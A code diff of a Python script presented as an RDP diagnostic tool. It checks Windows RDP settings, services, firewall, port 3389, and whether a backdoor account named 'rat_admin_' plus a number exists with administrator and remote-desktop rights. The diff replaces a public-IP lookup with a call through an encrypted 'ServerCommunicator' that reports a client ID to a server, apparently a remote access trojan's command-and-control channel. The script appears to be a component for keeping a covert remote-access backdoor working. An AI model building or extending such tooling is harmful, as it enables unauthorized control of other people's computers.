@@ -1,13 +1,15 @@
 import subprocess
 import socket
 import winreg
-import requests
 import logging
 import os
 import ctypes
 import time
 import json
 from datetime import datetime
+from config import Config
+from network.communicator import ServerCommunicator, CommunicationError
+from encryption.manager import EncryptionManager
 
 # Setup logging
 LOG_FILE = "rdp_diagnostic.log"
@@ -29,14 +31,12 @@ class RDPDiagnostic:
         self.logger = logging.getLogger("RDPDiagnostic")
 
     def _is_admin(self) -> bool:
-        """Check if the script is running with admin privileges."""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
         except Exception:
             return False
 
     def _run_command(self, cmd: list, timeout: int = 30) -> dict:
-        """Run a command and capture output."""
         try:
             result = subprocess.run(
                 cmd,
@@ -53,7 +53,6 @@ class RDPDiagnostic:
             return {"status": "error", "stdout": "", "stderr": str(e)}
 
     def test_admin_privileges(self):
-        """Test if the script is running with admin privileges."""
         self.logger.info("Testing admin privileges...")
         is_admin = self._is_admin()
         result = {
@@ -64,7 +63,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_rdp_registry(self):
-        """Test RDP registry settings."""
         self.logger.info("Testing RDP registry settings...")
         try:
             reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
@@ -88,7 +86,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_rdp_services(self):
-        """Test RDP-related services."""
         self.logger.info("Testing RDP services...")
         services = ["TermService", "SessionEnv", "UmRdpService"]
         result = {"status": "success", "services": {}, "message": ""}
@@ -106,7 +103,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_firewall(self):
-        """Test firewall rules for RDP (port 3389)."""
         self.logger.info("Testing firewall rules...")
         cmd_result = self._run_command(["netsh", "advfirewall", "firewall", "show", "rule", "name=Allow RDP"])
         if cmd_result["status"] == "success" and "Enabled: Yes" in cmd_result["stdout"]:
@@ -117,7 +113,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_port_3389(self):
-        """Test if port 3389 is listening."""
         self.logger.info("Testing port 3389...")
         cmd_result = self._run_command(["netstat", "-an"])
         if cmd_result["status"] == "success" and ":3389" in cmd_result["stdout"] and "LISTENING" in cmd_result["stdout"]:
@@ -136,7 +131,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_local_connection(self):
-        """Test local connection to port 3389."""
         self.logger.info("Testing local RDP connection...")
         try:
             local_ip = self._get_local_ip()
@@ -154,7 +148,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_network(self):
-        """Test network configuration (local and public IP)."""
         self.logger.info("Testing network configuration...")
         local_ip = self._get_local_ip()
         public_ip = self._get_public_ip()
@@ -173,10 +166,9 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_rdp_user(self):
-        """Test RDP user existence and group membership."""
         self.logger.info("Testing RDP user...")
         username = None
-        for user in ["rat_admin_" + str(i) for i in range(1000)]:  # Check for any rat_admin_ user
+        for user in ["rat_admin_" + str(i) for i in range(1000)]:
             if self._user_exists(user):
                 username = user
                 break
@@ -200,7 +192,6 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def test_event_logs(self):
-        """Test Windows event logs for RDP-related errors."""
         self.logger.info("Testing event logs...")
         try:
             ps_command = (
@@ -226,17 +217,14 @@ class RDPDiagnostic:
         self.logger.info(result["message"])
 
     def _user_exists(self, username: str) -> bool:
-        """Check if a user exists."""
         cmd_result = self._run_command(["net", "user", username])
         return cmd_result["status"] == "success"
 
     def _is_user_in_group(self, username: str, group: str) -> bool:
-        """Check if a user is in a specific group."""
         cmd_result = self._run_command(["net", "localgroup", group])
         return cmd_result["status"] == "success" and username in cmd_result["stdout"]
 
     def _get_local_ip(self) -> str:
-        """Get local IP address."""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -247,15 +235,18 @@ class RDPDiagnostic:
             return "unknown"
 
     def _get_public_ip(self) -> str:
-        """Get public IP address."""
         try:
-            response = requests.get("https://api.ipify.org", timeout=5)
-            return response.text.strip()
-        except Exception:
+            communicator = ServerCommunicator(Config.get_client_id(), EncryptionManager(Config.ENCRYPTION_KEY))
+            response = communicator._send_request(
+                "action=get_public_ip",
+                data={"client_id": Config.get_client_id()}
+            )
+            return response[0].get('public_ip', 'unknown') if response else 'unknown'
+        except CommunicationError as e:
+            self.logger.error(f"Public IP retrieval error: {str(e)}")
             return "unknown"
 
     def run_all_tests(self):
-        """Run all diagnostic tests."""
         self.logger.info("Starting RDP diagnostic tests...")
         self.test_admin_privileges()
         self.test_rdp_registry()
@@ -269,7 +260,6 @@ class RDPDiagnostic:
         self.logger.info("Diagnostic tests completed")
 
     def save_results(self):
-        """Save test results to a JSON file."""
         output_file = "rdp_diagnostic_results.json"
         try:
             with open(output_file, "w", encoding="utf-8") as f:
@@ -279,7 +269,6 @@ class RDPDiagnostic:
             self.logger.error(f"Failed to save results: {str(e)}")
 
     def print_summary(self):
-        """Print a summary of test results."""
         print("\n=== RDP Diagnostic Summary ===")
         for test_name, result in self.results["tests"].items():
             status = "PASS" if result["status"] == "success" else "FAIL"
@@ -292,21 +281,20 @@ class RDPDiagnostic:
             if self.results["tests"]["rdp_registry"]["status"] == "error":
                 print("- Enable RDP in registry (set fDenyTSConnections to 0) or check port number.")
             if self.results["tests"]["rdp_services"]["status"] == "error":
-                print("- Start RDP services (net start TermService, SessionEnv, UmRdpService).")
+                print("- Start RDP-related services (TermService, SessionEnv, UmRdpService).")
             if self.results["tests"]["firewall"]["status"] == "error":
-                print("- Add firewall rule for port 3389 (netsh advfirewall firewall add rule ...).")
+                print("- Enable firewall rule for RDP (port 3389).")
             if self.results["tests"]["port_3389"]["status"] == "error":
-                print("- Ensure port 3389 is open and listening (restart TermService if needed).")
+                print("- Ensure port 3389 is open and listening.")
             if self.results["tests"]["local_connection"]["status"] == "error":
-                print("- Check local connectivity to port 3389 (possible firewall or service issue).")
+                print("- Verify local connectivity to port 3389.")
             if self.results["tests"]["network"]["status"] == "error":
-                print("- Verify network connectivity and IP addresses.")
-            if "NAT detected" in self.results["tests"]["network"]["message"]:
-                print("- Forward port 3389 on your router to the local IP.")
+                print("- Check network connectivity and NAT/port forwarding for RDP.")
             if self.results["tests"]["rdp_user"]["status"] == "error":
-                print("- Create or configure RDP user with correct group memberships.")
+                print("- Ensure the RDP user exists and is in Administrators and Remote Desktop Users groups.")
             if self.results["tests"]["event_logs"]["status"] == "error":
-                print("- Check Windows Event Viewer for RDP-related errors.")
+                print("- Check event logs for RDP-related errors.")
+        print("\n=== End of Summary ===")
 
 if __name__ == "__main__":
     diagnostic = RDPDiagnostic()
